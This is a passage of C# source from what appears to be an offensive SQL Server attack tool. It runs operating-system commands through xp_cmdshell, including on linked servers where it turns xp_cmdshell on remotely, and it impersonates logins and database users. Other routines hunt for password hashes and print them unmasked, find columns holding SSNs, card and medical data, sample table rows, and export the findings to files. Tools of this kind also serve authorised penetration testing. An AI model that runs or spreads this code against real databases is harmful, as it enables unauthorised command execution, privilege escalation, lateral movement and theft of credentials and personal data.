							logger?.LogAction("CLI_XP_CMD", cmd, "Executing xp_cmdshell via CLI");
							EnableAdvancedOption("xp_cmdshell", con);
							string cmdResult = ExecuteScalar($"EXEC xp_cmdshell '{cmd.Replace("'", "''")}'", con);
							Console.WriteLine(cmdResult);
							logger?.LogAction("CLI_XP_RESULT", cmd, cmdResult);
							break;
						case "impersonate_login":
							string targetLogin = Arg(args, "--target");
							if (targetLogin == null)
							{
								Console.WriteLine("[!] --target is required for impersonate_login action");
								logger?.LogAction("CLI_ERROR", "impersonate_login", "Missing --target parameter", "ERROR");
								return;
							}
							logger?.LogAction("CLI_IMPERSONATE_LOGIN", targetLogin, "Impersonating login via CLI");
							ExecuteNonQuery($"EXECUTE AS LOGIN = '{targetLogin.Replace("'", "''")}'", con);
							string impersonatedUser = ExecuteScalar("SELECT SYSTEM_USER;", con);
							Console.WriteLine($"[+] Now executing as {impersonatedUser}");
							logger?.LogAction("CLI_IMPERSONATE_SUCCESS", targetLogin, $"Successfully impersonated as {impersonatedUser}");
							break;
						case "impersonate_user":
							string targetUser = Arg(args, "--target");
							if (targetUser == null)
							{
								Console.WriteLine("[!] --target is required for impersonate_user action");
								logger?.LogAction("CLI_ERROR", "impersonate_user", "Missing --target parameter", "ERROR");
								return;
							}
							logger?.LogAction("CLI_IMPERSONATE_USER", targetUser, "Impersonating database user via CLI");
							ExecuteNonQuery($"EXECUTE AS USER = '{targetUser.Replace("'", "''")}'", con);
							string impersonatedDbUser = ExecuteScalar("SELECT USER_NAME();", con);
							Console.WriteLine($"[+] Now executing as DB user {impersonatedDbUser}");
							logger?.LogAction("CLI_IMPERSONATE_SUCCESS", targetUser, $"Successfully impersonated as DB user {impersonatedDbUser}");
							break;
						case "linked_enum":
							logger?.LogAction("CLI_LINKED_ENUM", "linked_enum", "Enumerating linked servers via CLI");
							var linkedServers = new List<string>();
							using (var reader = new SqlCommand("EXEC sp_linkedservers;", con).ExecuteReader())
							{
								while (reader.Read()) 
									linkedServers.Add(reader[0].ToString() ?? "");
							}
							
							Console.WriteLine("Linked servers (with remote login):");
							foreach (string serverName in linkedServers)
							{
								Console.WriteLine($"--- {serverName} ---");
								string login = TestLinkedServerConnectivity(serverName, con);
								Console.WriteLine($"   RESULT    : {(string.IsNullOrEmpty(login) ? "<no access>" : login)}");
							}
							logger?.LogAction("CLI_LINKED_ENUM_RESULT", "linked_enum", $"Found {linkedServers.Count} linked servers");
							break;
						case "linked_exec":
							string linkedSrv = Arg(args, "--linked");
							string lcmd = Arg(args, "--cmd");
							if (linkedSrv == null || lcmd == null)
							{
								Console.WriteLine("[!] --linked and --cmd are required for linked_exec action");
								logger?.LogAction("CLI_ERROR", "linked_exec", "Missing --linked or --cmd parameter", "ERROR");
								return;
							}
							logger?.LogAction("CLI_LINKED_EXEC", $"{linkedSrv}: {lcmd}", "Executing command on linked server via CLI");
							string exec = $"EXEC ('xp_cmdshell ''{lcmd.Replace("'", "''")}''') AT [{linkedSrv}]";
							string outp = ExecuteScalar(exec, con);
							if (string.IsNullOrEmpty(outp))
							{
								Console.WriteLine("[i] xp_cmdshell might be disabled. Attempting to enable remotely...");
								string enable = $"EXEC ('sp_configure ''\'show advanced options\'',1;reconfigure; EXEC sp_configure ''\'xp_cmdshell\'',1;reconfigure;') AT [{linkedSrv}]";
								if (ExecuteNonQuery(enable, con))
								{
									outp = ExecuteScalar(exec, con);
								}
							}
							Console.WriteLine(outp);
							logger?.LogAction("CLI_LINKED_EXEC_RESULT", $"{linkedSrv}: {lcmd}", outp);
							break;
						case "oa_cmd":
							string ocmd = Arg(args, "--cmd");
							if (ocmd == null)
							{
								Console.WriteLine("[!] --cmd is required for oa_cmd action");
								logger?.LogAction("CLI_ERROR", "oa_cmd", "Missing --cmd parameter", "ERROR");
								return;
							}
							logger?.LogAction("CLI_OA_CMD", ocmd, "Executing OLE Automation command via CLI");
							OAExec(ocmd, con);
							break;
						default:
							Console.WriteLine($"[!] Unknown action '{action}'");
							logger?.LogAction("CLI_ERROR", $"Unknown action: {action}", "Invalid action specified", "ERROR");
							break;
					}
			}
			finally
			{
				// Always close the logger when done
				logger?.Close();
			}
		}
	}

	private static void RunAutoEnumeration(SqlConnection con, string wordlistFile = null)
	{
		Console.WriteLine("[*] Starting comprehensive enumeration...\n");
		logger?.LogAction("AUTO_ENUM_START", "Comprehensive enumeration", "Starting automated enumeration");

		// 1. Basic enumeration
		Console.WriteLine("=== BASIC ENUMERATION ===");
		Enumerate(con);

		// 2. Database discovery and analysis
		Console.WriteLine("\n=== DATABASE ANALYSIS ===");
		AnalyzeAllDatabases(con);

		// 3. Credential hunting
		Console.WriteLine("\n=== CREDENTIAL HUNTING ===");
		HuntCredentials(con, wordlistFile);

		// 4. Sensitive data discovery
		Console.WriteLine("\n=== SENSITIVE DATA DISCOVERY ===");
		DiscoverSensitiveData(con, wordlistFile);

		// 5. Hash analysis
		Console.WriteLine("\n=== HASH ANALYSIS ===");
		AnalyzeHashes(con);

		// 6. Final summary
		Console.WriteLine("\n=== AUTO-ENUMERATION COMPLETE ===");
		Console.WriteLine("Check the session output directory for detailed results.");
		logger?.LogAction("AUTO_ENUM_COMPLETE", "Comprehensive enumeration", "Automated enumeration completed successfully");
	}

	private static void AnalyzeAllDatabases(SqlConnection con)
	{
		var databases = new List<string>();
		
		// Get list of databases
		using (var reader = new SqlCommand("SELECT name FROM sys.databases WHERE name NOT IN ('master','tempdb','model','msdb');", con).ExecuteReader())
		{
			while (reader.Read())
			{
				databases.Add(reader[0].ToString());
			}
		}

		logger?.LogAction("DATABASE_DISCOVERY", "Enumerate databases", $"Found {databases.Count} user databases");

		foreach (string dbName in databases)
		{
			Console.WriteLine($"\n--- Analyzing Database: {dbName} ---");
			
			try
			{
				// Switch to database
				ExecuteNonQuery($"USE [{dbName}];", con);
				
				// Get table count
				string tableCount = ExecuteScalar("SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';", con);
				Console.WriteLine($"   Tables: {tableCount}");
				
				// Look for interesting tables
				SearchInterestingTablesInDatabase(dbName, con);
				SearchCredentialsInDatabase(dbName, con);
				SearchSensitiveDataInDatabase(dbName, con);
				
				logger?.LogAction("DATABASE_ANALYSIS", $"Analyze database: {dbName}", $"Completed analysis of {dbName}");
			}
			catch (Exception ex)
			{
				Console.WriteLine($"   [!] Error analyzing {dbName}: {ex.Message}");
				logger?.LogAction("DATABASE_ANALYSIS", $"Analyze database: {dbName}", ex.Message, "ERROR");
			}
		}
		
		// Switch back to master
		ExecuteNonQuery("USE master;", con);
	}

	private static void HuntCredentials(SqlConnection con, string wordlistFile = null)
	{
		var credentialTerms = new List<string> 
		{ 
			"password", "pass", "pwd", "secret", "key", "token", "hash", "credential", "cred", 
			"login", "user", "account", "auth", "authentication", "svc", "service"
		};

		// Load custom wordlist if provided
		if (!string.IsNullOrEmpty(wordlistFile) && File.Exists(wordlistFile))
		{
			try
			{
				var customTerms = File.ReadAllLines(wordlistFile).Where(line => !string.IsNullOrWhiteSpace(line));
				credentialTerms.AddRange(customTerms);
				Console.WriteLine($"[+] Loaded {customTerms.Count()} terms from wordlist");
				logger?.LogAction("WORDLIST_LOAD", $"Load wordlist: {wordlistFile}", $"Loaded {customTerms.Count()} terms");
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error loading wordlist: {ex.Message}");
				logger?.LogAction("WORDLIST_LOAD", $"Load wordlist: {wordlistFile}", ex.Message, "ERROR");
			}
		}

		foreach (string term in credentialTerms.Distinct())
		{
			FindTablesWithColumn(term, con);
		}
	}

	private static void DiscoverSensitiveData(SqlConnection con, string wordlistFile = null)
	{
		var sensitiveTerms = new List<string> 
		{ 
			"ssn", "social", "credit", "card", "bank", "account", "routing", "tax", "salary", 
			"personal", "private", "confidential", "classified", "restricted", "email", "phone",
			"address", "dob", "birth", "license", "passport", "medical", "health"
		};

		// Load custom wordlist if provided
		if (!string.IsNullOrEmpty(wordlistFile) && File.Exists(wordlistFile))
		{
			try
			{
				var customTerms = File.ReadAllLines(wordlistFile).Where(line => !string.IsNullOrWhiteSpace(line));
				sensitiveTerms.AddRange(customTerms);
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error loading wordlist for sensitive data: {ex.Message}");
			}
		}

		foreach (string term in sensitiveTerms.Distinct())
		{
			FindTablesWithColumn(term, con);
		}
	}

	private static void AnalyzeHashes(SqlConnection con)
	{
		Console.WriteLine("[*] Analyzing password hashes...");
		
		// Look for common hash patterns in data
		string sql = @"
			SELECT 
				t.TABLE_SCHEMA,
				t.TABLE_NAME,
				c.COLUMN_NAME,
				c.DATA_TYPE
			FROM INFORMATION_SCHEMA.TABLES t
			INNER JOIN INFORMATION_SCHEMA.COLUMNS c ON t.TABLE_NAME = c.TABLE_NAME
			WHERE (LOWER(c.COLUMN_NAME) LIKE '%hash%' 
				OR LOWER(c.COLUMN_NAME) LIKE '%password%'
				OR LOWER(c.COLUMN_NAME) LIKE '%pwd%')
			AND c.DATA_TYPE IN ('varchar', 'nvarchar', 'char', 'nchar', 'text', 'ntext')
			ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME;";
		
		var potentialHashColumns = new List<(string schema, string table, string column, string dataType)>();
		
		try
		{
			using (var cmd = new SqlCommand(sql, con))
			using (var reader = cmd.ExecuteReader())
			{
				while (reader.Read())
				{
					potentialHashColumns.Add((
						reader[0].ToString(),
						reader[1].ToString(), 
						reader[2].ToString(),
						reader[3].ToString()
					));
				}
			}

			if (potentialHashColumns.Any())
			{
				Console.WriteLine("   Potential hash columns found:");
				var hashAnalysis = new List<string>();
				
				foreach (var col in potentialHashColumns)
				{
					Console.WriteLine($"   > {col.schema}.{col.table}.{col.column} ({col.dataType})");
					
					// Sample data to identify hash types
					try
					{
						string sampleSql = $"SELECT TOP 5 [{col.column}] FROM [{col.schema}].[{col.table}] WHERE [{col.column}] IS NOT NULL AND LEN([{col.column}]) > 10;";
						using (var sampleCmd = new SqlCommand(sampleSql, con))
						using (var sampleReader = sampleCmd.ExecuteReader())
						{
							while (sampleReader.Read())
							{
								string hashValue = sampleReader[0]?.ToString();
								if (!string.IsNullOrEmpty(hashValue))
								{
									string hashType = IdentifyHashType(hashValue);
									if (!string.IsNullOrEmpty(hashType))
									{
										string analysis = $"{col.schema}.{col.table}.{col.column}: {hashType} - {hashValue}";
										hashAnalysis.Add(analysis);
										Console.WriteLine($"     └─ {hashType}: {hashValue}");
									}
								}
							}
						}
					}
					catch (Exception ex)
					{
						Console.WriteLine($"     └─ Error sampling data: {ex.Message}");
					}
				}
				
				if (hashAnalysis.Any())
				{
					logger?.ExportCredentials(hashAnalysis);
					Console.WriteLine($"   [+] Hash analysis exported to credentials file");
				}
			}
			else
			{
				Console.WriteLine("   No obvious hash columns found");
			}
			
			logger?.LogAction("HASH_ANALYSIS", "Analyze password hashes", $"Found {potentialHashColumns.Count} potential hash columns");
		}
		catch (Exception ex)
		{
			Console.WriteLine($"[!] Error during hash analysis: {ex.Message}");
			logger?.LogAction("HASH_ANALYSIS", "Analyze password hashes", ex.Message, "ERROR");
		}
	}

	private static string IdentifyHashType(string hash)
	{
		if (string.IsNullOrEmpty(hash)) return null;
		
		hash = hash.Trim();
		
		// Common hash patterns
		if (hash.Length == 32 && IsHex(hash))
			return "MD5";
		else if (hash.Length == 40 && IsHex(hash))
			return "SHA1";
		else if (hash.Length == 64 && IsHex(hash))
			return "SHA256";
		else if (hash.Length == 128 && IsHex(hash))
			return "SHA512";
		else if (hash.StartsWith("$2a$") || hash.StartsWith("$2b$") || hash.StartsWith("$2y$"))
			return "bcrypt";
		else if (hash.StartsWith("$6$"))
			return "SHA512crypt";
		else if (hash.StartsWith("$5$"))
			return "SHA256crypt";
		else if (hash.StartsWith("$1$"))
			return "MD5crypt";
		else if (hash.StartsWith("{SHA}"))
			return "LDAP SHA1";
		else if (hash.StartsWith("{SSHA}"))
			return "LDAP SSHA";
		else if (hash.Contains(":") && hash.Split(':').Length == 2)
		{
			var parts = hash.Split(':');
			if (parts[0].Length == 32 && parts[1].Length == 32 && IsHex(parts[0]) && IsHex(parts[1]))
				return "NTLM (LM:NTLM)";
		}
		else if (hash.Length == 32 && IsHex(hash))
			return "Possible NTLM";
		
		return null;
	}

	private static bool IsHex(string input)
	{
		return input.All(c => "0123456789ABCDEFabcdef".Contains(c));
	}

	private static void HuntCredentialsInInterestingTables(SqlConnection con)
	{
		Console.WriteLine("[*] Hunting for credentials in interesting tables...");
		logger?.LogAction("CREDENTIAL_HUNT_START", "Credential hunting", "Starting automated credential discovery");
		
		var foundCredentials = new List<object>();
		var credKeywords = new[] { "password", "passwd", "pwd", "pass", "credential", "cred", "secret", "key", "token", "hash", "salt" };
		var userKeywords = new[] { "user", "username", "login", "account", "email", "name" };
		
		try
		{
			// Get all databases
			var databases = new List<string>();
			using (var reader = new SqlCommand("SELECT name FROM sys.databases WHERE name NOT IN ('tempdb') ORDER BY name;", con).ExecuteReader())
			{
				while (reader.Read())
				{
					databases.Add(reader[0].ToString());
				}
			}
			
			foreach (string dbName in databases)
			{
				Console.WriteLine($"\n[*] Searching database: {dbName}");
				
				try
				{
					// Find tables with credential-related columns
					string credTablesSql = $@"
						SELECT DISTINCT t.TABLE_SCHEMA, t.TABLE_NAME
						FROM [{dbName}].INFORMATION_SCHEMA.TABLES t
						INNER JOIN [{dbName}].INFORMATION_SCHEMA.COLUMNS c ON t.TABLE_NAME = c.TABLE_NAME AND t.TABLE_SCHEMA = c.TABLE_SCHEMA
						WHERE t.TABLE_TYPE = 'BASE TABLE'
						AND (LOWER(c.COLUMN_NAME) LIKE '%password%' OR LOWER(c.COLUMN_NAME) LIKE '%pwd%' 
							 OR LOWER(c.COLUMN_NAME) LIKE '%pass%' OR LOWER(c.COLUMN_NAME) LIKE '%credential%'
							 OR LOWER(c.COLUMN_NAME) LIKE '%secret%' OR LOWER(c.COLUMN_NAME) LIKE '%hash%'
							 OR LOWER(c.COLUMN_NAME) LIKE '%key%' OR LOWER(c.COLUMN_NAME) LIKE '%token%')
						ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME";
					
					var credTables = new List<(string schema, string table)>();
					using (var reader = new SqlCommand(credTablesSql, con).ExecuteReader())
					{
						while (reader.Read())
						{
							credTables.Add((reader[0].ToString(), reader[1].ToString()));
						}
					}
					
					Console.WriteLine($"   - Found {credTables.Count} tables with credential columns");
					
					foreach (var (schema, table) in credTables.Take(10)) // Limit to prevent overwhelming output
					{
						try
						{
							string fullTableName = $"[{dbName}].{schema}.{table}";
							Console.WriteLine($"   - Analyzing: {fullTableName}");
							
							// Get column information
							string columnsSql = $@"
								SELECT COLUMN_NAME, DATA_TYPE
								FROM [{dbName}].INFORMATION_SCHEMA.COLUMNS
								WHERE TABLE_SCHEMA = '{schema}' AND TABLE_NAME = '{table}'
								ORDER BY ORDINAL_POSITION";
							
							var columns = new List<(string name, string type)>();
							using (var reader = new SqlCommand(columnsSql, con).ExecuteReader())
							{
								while (reader.Read())
								{
									columns.Add((reader[0].ToString(), reader[1].ToString()));
								}
							}
							
							// Find credential and user columns
							var credColumns = columns.Where(c => credKeywords.Any(k => c.name.ToLower().Contains(k))).ToList();
							var userColumns = columns.Where(c => userKeywords.Any(k => c.name.ToLower().Contains(k))).ToList();
							
							if (credColumns.Any())
							{
								// Sample data from this table
								string sampleSql = $"SELECT TOP 10 * FROM {fullTableName}";
								var tableData = new Dictionary<string, object>
								{
									["Database"] = dbName,
									["Schema"] = schema,
									["TableName"] = table,
									["CredentialColumns"] = credColumns.Select(c => c.name).ToList(),
									["UserColumns"] = userColumns.Select(c => c.name).ToList(),
									["SampleRows"] = new List<object>()
								};
								
								using (var cmd = new SqlCommand(sampleSql, con))
								using (var reader = cmd.ExecuteReader())
								{
									var rows = new List<object>();
									while (reader.Read() && rows.Count < 10)
									{
										var row = new Dictionary<string, object>();
										for (int i = 0; i < reader.FieldCount; i++)
										{
											string columnName = reader.GetName(i);
											object value = reader.IsDBNull(i) ? null : reader.GetValue(i);
											
											// Truncate long values and mask potential passwords
											if (value is string strValue)
											{
												if (credKeywords.Any(k => columnName.ToLower().Contains(k)))
												{
													// Mask credential values but show structure
													if (strValue.Length > 0)
														value = $"[CREDENTIAL:{strValue.Length}chars]";
												}
												else if (strValue.Length > 50)
												{
													value = strValue.Substring(0, 50) + "...";
												}
											}
											
											row[columnName] = value;
										}
										rows.Add(row);
									}
									tableData["SampleRows"] = rows;
									tableData["RowCount"] = rows.Count;
								}
								
								foundCredentials.Add(tableData);
								Console.WriteLine($"     - Found {credColumns.Count} credential columns, {userColumns.Count} user columns");
							}
						}
						catch (Exception ex)
						{
							Console.WriteLine($"     [!] Error analyzing {schema}.{table}: {ex.Message}");
						}
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine($"   [!] Error searching {dbName}: {ex.Message}");
				}
			}
			
			// Export findings
			if (foundCredentials.Any())
			{
				var credentialReport = new
				{
					Timestamp = DateTime.Now,
					TablesAnalyzed = foundCredentials.Count,
					CredentialTables = foundCredentials
				};
				
				logger?.ExportStructuredData("credential_hunt.json", credentialReport, "Export credential hunting results");
				logger?.LogAction("CREDENTIAL_HUNT_COMPLETE", "Credential hunting", $"Found {foundCredentials.Count} tables with potential credentials");
				
				Console.WriteLine($"\n[+] Credential hunting complete:");
				Console.WriteLine($"    - {foundCredentials.Count} tables with potential credentials found");
				Console.WriteLine($"    - Results exported to: credential_hunt.json");
			}
			else
			{
				Console.WriteLine("\n[+] No credential tables found");
				logger?.LogAction("CREDENTIAL_HUNT_COMPLETE", "Credential hunting", "No credential tables discovered");
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine($"[!] Error during credential hunting: {ex.Message}");
			logger?.LogAction("CREDENTIAL_HUNT_ERROR", "Credential hunting", ex.Message, "ERROR");
		}
	}

	private static void EnumerateComprehensiveDatabaseStructure(SqlConnection con)
	{
		Console.WriteLine("[*] Enumerating comprehensive database structure...");
		logger?.LogAction("DATABASE_STRUCTURE_START", "Comprehensive database structure enumeration", "Starting comprehensive database analysis");
		
		var databaseStructure = new List<object>();
		var allTables = new List<object>();
		var allColumns = new List<object>();
		
		try
		{
			// Get all databases
			var databases = new List<string>();
			using (var reader = new SqlCommand("SELECT name FROM sys.databases WHERE name NOT IN ('tempdb') ORDER BY name;", con).ExecuteReader())
			{
				while (reader.Read())
				{
					databases.Add(reader[0].ToString());
				}
			}
			
			Console.WriteLine($"[+] Found {databases.Count} databases");
			logger?.LogAction("DATABASE_COUNT", "Database discovery", $"Found {databases.Count} databases: {string.Join(", ", databases)}");
			
			foreach (string dbName in databases)
			{
				Console.WriteLine($"\n[*] Analyzing database: {dbName}");
				
				var dbInfo = new Dictionary<string, object>
				{
					["DatabaseName"] = dbName,
					["Tables"] = new List<object>(),
					["TableCount"] = 0,
					["ColumnCount"] = 0,
					["InterestingTables"] = new List<object>(),
					["CredentialColumns"] = new List<object>(),
					["SensitiveColumns"] = new List<object>()
				};
				
				try
				{
					// Get table information for this database
					string tablesSql = $@"
						SELECT 
							t.TABLE_SCHEMA,
							t.TABLE_NAME,
							t.TABLE_TYPE,
							(SELECT COUNT(*) FROM [{dbName}].INFORMATION_SCHEMA.COLUMNS c WHERE c.TABLE_NAME = t.TABLE_NAME AND c.TABLE_SCHEMA = t.TABLE_SCHEMA) as COLUMN_COUNT
						FROM [{dbName}].INFORMATION_SCHEMA.TABLES t 
						WHERE t.TABLE_TYPE = 'BASE TABLE'
						ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME;";
					
					var tables = new List<object>();
					using (var reader = new SqlCommand(tablesSql, con).ExecuteReader())
					{
						while (reader.Read())
						{
							var tableInfo = new
							{
								Schema = reader[0].ToString(),
								TableName = reader[1].ToString(),
								TableType = reader[2].ToString(),
								ColumnCount = Convert.ToInt32(reader[3])
							};
							tables.Add(tableInfo);
							allTables.Add(new
							{
								Database = dbName,
								Schema = tableInfo.Schema,
								TableName = tableInfo.TableName,
								ColumnCount = tableInfo.ColumnCount
							});
						}
					}
					
					dbInfo["Tables"] = tables;
					dbInfo["TableCount"] = tables.Count;
					
					Console.WriteLine($"   - Tables: {tables.Count}");
					
					// Get all columns for this database
					string columnsSql = $@"
						SELECT 
							c.TABLE_SCHEMA,
							c.TABLE_NAME,
							c.COLUMN_NAME,
							c.DATA_TYPE,
							c.IS_NULLABLE,
							c.CHARACTER_MAXIMUM_LENGTH,
							c.COLUMN_DEFAULT
						FROM [{dbName}].INFORMATION_SCHEMA.COLUMNS c
						INNER JOIN [{dbName}].INFORMATION_SCHEMA.TABLES t ON c.TABLE_NAME = t.TABLE_NAME AND c.TABLE_SCHEMA = t.TABLE_SCHEMA
						WHERE t.TABLE_TYPE = 'BASE TABLE'
						ORDER BY c.TABLE_SCHEMA, c.TABLE_NAME, c.ORDINAL_POSITION;";
					
					var columns = new List<object>();
					using (var reader = new SqlCommand(columnsSql, con).ExecuteReader())
					{
						while (reader.Read())
						{
							var columnInfo = new
							{
								Schema = reader[0].ToString(),
								TableName = reader[1].ToString(),
								ColumnName = reader[2].ToString(),
								DataType = reader[3].ToString(),
								IsNullable = reader[4].ToString(),
								MaxLength = reader[5]?.ToString(),
								DefaultValue = reader[6]?.ToString()
							};
							columns.Add(columnInfo);
							allColumns.Add(new
							{
								Database = dbName,
								Schema = columnInfo.Schema,
								TableName = columnInfo.TableName,
								ColumnName = columnInfo.ColumnName,
								DataType = columnInfo.DataType,
								IsNullable = columnInfo.IsNullable,
								MaxLength = columnInfo.MaxLength
							});
						}
					}
					
					dbInfo["ColumnCount"] = columns.Count;
					Console.WriteLine($"   - Columns: {columns.Count}");
					
					// Find interesting tables (containing keywords)
					var interestingKeywords = new[] { "user", "admin", "password", "credential", "login", "account", "auth", "config", "setting", "secret", "key", "token", "session" };
					var interestingTables = new List<object>();
					
					foreach (var table in tables)
					{
						var tableName = ((dynamic)table).TableName.ToString().ToLower();
						var matchedKeywords = interestingKeywords.Where(k => tableName.Contains(k)).ToList();
						if (matchedKeywords.Any())
						{
							interestingTables.Add(new
							{
								Schema = ((dynamic)table).Schema,
								TableName = ((dynamic)table).TableName,
								MatchedKeywords = matchedKeywords
							});
						}
					}
					
					dbInfo["InterestingTables"] = interestingTables;
					if (interestingTables.Any())
					{
						Console.WriteLine($"   - Interesting tables: {interestingTables.Count}");
					}
					
					// Find credential-related columns
					var credKeywords = new[] { "password", "passwd", "pwd", "pass", "credential", "cred", "secret", "key", "token", "hash", "salt" };
					var credentialColumns = new List<object>();
					
					foreach (var column in columns)
					{
						var columnName = ((dynamic)column).ColumnName.ToString().ToLower();
						var matchedCredKeywords = credKeywords.Where(k => columnName.Contains(k)).ToList();
						if (matchedCredKeywords.Any())
						{
							credentialColumns.Add(new
							{
								Schema = ((dynamic)column).Schema,
								TableName = ((dynamic)column).TableName,
								ColumnName = ((dynamic)column).ColumnName,
								DataType = ((dynamic)column).DataType,
								MatchedKeywords = matchedCredKeywords
							});
						}
					}
					
					dbInfo["CredentialColumns"] = credentialColumns;
					if (credentialColumns.Any())
					{
						Console.WriteLine($"   - Credential columns: {credentialColumns.Count}");
					}
					
					// Find sensitive data columns
					var sensitiveKeywords = new[] { "ssn", "social", "credit", "card", "email", "phone", "address", "salary", "wage", "personal", "private", "confidential" };
					var sensitiveColumns = new List<object>();
					
					foreach (var column in columns)
					{
						var columnName = ((dynamic)column).ColumnName.ToString().ToLower();
						var matchedSensitiveKeywords = sensitiveKeywords.Where(k => columnName.Contains(k)).ToList();
						if (matchedSensitiveKeywords.Any())
						{
							sensitiveColumns.Add(new
							{
								Schema = ((dynamic)column).Schema,
								TableName = ((dynamic)column).TableName,
								ColumnName = ((dynamic)column).ColumnName,
								DataType = ((dynamic)column).DataType,
								MatchedKeywords = matchedSensitiveKeywords
							});
						}
					}
					
					dbInfo["SensitiveColumns"] = sensitiveColumns;
					if (sensitiveColumns.Any())
					{
						Console.WriteLine($"   - Sensitive columns: {sensitiveColumns.Count}");
					}
					
					// Sample interesting table data
					var sampleData = new List<object>();
					foreach (var table in interestingTables.Take(3)) // Only sample first 3 interesting tables
					{
						try
						{
							string tableName = ((dynamic)table).TableName;
							string schema = ((dynamic)table).Schema;
							string fullTableName = $"[{dbName}].{schema}.{tableName}";
							
							Console.WriteLine($"   - Sampling data from: {fullTableName}");
							
							string sampleSql = $"SELECT TOP 5 * FROM {fullTableName}";
							var tableData = new Dictionary<string, object>
							{
								["TableName"] = fullTableName,
								["Rows"] = new List<object>()
							};
							
							using (var cmd = new SqlCommand(sampleSql, con))
							using (var reader = cmd.ExecuteReader())
							{
								var rows = new List<object>();
								while (reader.Read() && rows.Count < 5)
								{
									var row = new Dictionary<string, object>();
									for (int i = 0; i < reader.FieldCount; i++)
									{
										string columnName = reader.GetName(i);
										object value = reader.IsDBNull(i) ? null : reader.GetValue(i);
										
										// Truncate long values
										if (value is string strValue && strValue.Length > 100)
											value = strValue.Substring(0, 100) + "...";
										
										row[columnName] = value;
									}
									rows.Add(row);
								}
								tableData["Rows"] = rows;
								tableData["SampleCount"] = rows.Count;
							}
							
							sampleData.Add(tableData);
						}
						catch (Exception ex)
						{
							Console.WriteLine($"   [!] Error sampling table data: {ex.Message}");
						}
					}
					
					dbInfo["SampleData"] = sampleData;
				}
				catch (Exception ex)
				{
					Console.WriteLine($"   [!] Error analyzing {dbName}: {ex.Message}");
					logger?.LogAction("DATABASE_ANALYSIS_ERROR", $"Error analyzing {dbName}", ex.Message, "ERROR");
				}
				
				databaseStructure.Add(dbInfo);
			}
			
			// Export comprehensive database structure
			var comprehensiveStructure = new
			{
				Timestamp = DateTime.Now,
				TotalDatabases = databases.Count,
				TotalTables = allTables.Count,
				TotalColumns = allColumns.Count,
				DatabaseDetails = databaseStructure,
				AllTables = allTables,
				AllColumns = allColumns
			};
			
			logger?.ExportStructuredData("database_structure.json", comprehensiveStructure, "Export comprehensive database structure");
			logger?.LogAction("DATABASE_STRUCTURE_COMPLETE", "Comprehensive database structure", $"Analyzed {databases.Count} databases, {allTables.Count} tables, {allColumns.Count} columns");
			
			Console.WriteLine($"\n[+] Database structure analysis complete:");
			Console.WriteLine($"    - {databases.Count} databases analyzed");
			Console.WriteLine($"    - {allTables.Count} total tables found");
			Console.WriteLine($"    - {allColumns.Count} total columns found");
			Console.WriteLine($"    - Exported to: database_structure.json");
		}
		catch (Exception ex)
		{
			Console.WriteLine($"[!] Error during database structure enumeration: {ex.Message}");
			logger?.LogAction("DATABASE_STRUCTURE_ERROR", "Database structure enumeration", ex.Message, "ERROR");
		}
	}

	private static void EnumerateAllUsersAndPermissions(SqlConnection con)
	{
		Console.WriteLine("\n[*] Enumerating all users and permissions...");
		logger?.LogAction("USER_PERMISSIONS_START", "User and permission enumeration", "Starting comprehensive user and permission analysis");
		
		try
		{
			// Server-level logins
			Console.WriteLine("\n[+] Server-level logins:");
			var serverLogins = new List<object>();
			
			string loginsSql = @"
				SELECT 
					p.name,
					p.type_desc,
					p.is_disabled,
					p.create_date,
					p.modify_date,
					CASE WHEN EXISTS(SELECT 1 FROM sys.columns WHERE object_id = OBJECT_ID('sys.server_principals') AND name = 'is_policy_checked') 
						 AND p.is_policy_checked = 1 THEN 'Yes' ELSE 'No' END as policy_checked,
					CASE WHEN EXISTS(SELECT 1 FROM sys.columns WHERE object_id = OBJECT_ID('sys.server_principals') AND name = 'is_expiration_checked') 
						 AND p.is_expiration_checked = 1 THEN 'Yes' ELSE 'No' END as expiration_checked
				FROM sys.server_principals p
				WHERE p.type IN ('S', 'U', 'G')
				AND p.name NOT LIKE '##%'
				ORDER BY p.name;";
			
			using (var reader = new SqlCommand(loginsSql, con).ExecuteReader())
			{
				while (reader.Read())
				{
					var login = new
					{
						Name = reader[0].ToString(),
						Type = reader[1].ToString(),
						IsDisabled = Convert.ToBoolean(reader[2]),
						CreateDate = Convert.ToDateTime(reader[3]),
						ModifyDate = Convert.ToDateTime(reader[4]),
						PolicyChecked = reader[5].ToString(),
						ExpirationChecked = reader[6].ToString(),
						ServerRoles = new List<string>(),
						Permissions = new List<string>()
					};
					serverLogins.Add(login);
					Console.WriteLine($"   - {login.Name} ({login.Type}) - Disabled: {login.IsDisabled}");
				}
			}
			
			// Get server roles for each login
			foreach (var login in serverLogins)
			{
				string loginName = ((dynamic)login).Name;
				string rolesSql = $@"
					SELECT r.name
					FROM sys.server_role_members rm
					INNER JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
					INNER JOIN sys.server_principals p ON rm.member_principal_id = p.principal_id
					WHERE p.name = '{loginName.Replace("'", "''")}'";
				
				var roles = new List<string>();
				try
				{
					using (var reader = new SqlCommand(rolesSql, con).ExecuteReader())
					{
						while (reader.Read())
						{
							roles.Add(reader[0].ToString());
						}
					}
					((dynamic)login).ServerRoles = roles;
				}
				catch (Exception ex)
				{
					logger?.LogAction("USER_ROLES_ERROR", $"Error getting roles for {loginName}", ex.Message, "ERROR");
				}
			}
			
			// Database users for each database
			var allDatabaseUsers = new List<object>();
			var databases = new List<string>();
			using (var reader = new SqlCommand("SELECT name FROM sys.databases WHERE name NOT IN ('tempdb') ORDER BY name;", con).ExecuteReader())
			{
				while (reader.Read())
				{
					databases.Add(reader[0].ToString());
				}
			}
			
			foreach (string dbName in databases)
			{
				Console.WriteLine($"\n[+] Database users in '{dbName}':");
				
				try
				{
					string usersSql = $@"
						SELECT 
							p.name,
							p.type_desc,
							p.create_date,
							p.modify_date,
							ISNULL(l.name, 'No Login') as login_name
						FROM [{dbName}].sys.database_principals p
						LEFT JOIN [{dbName}].sys.server_principals l ON p.sid = l.sid
						WHERE p.type IN ('S', 'U', 'G')
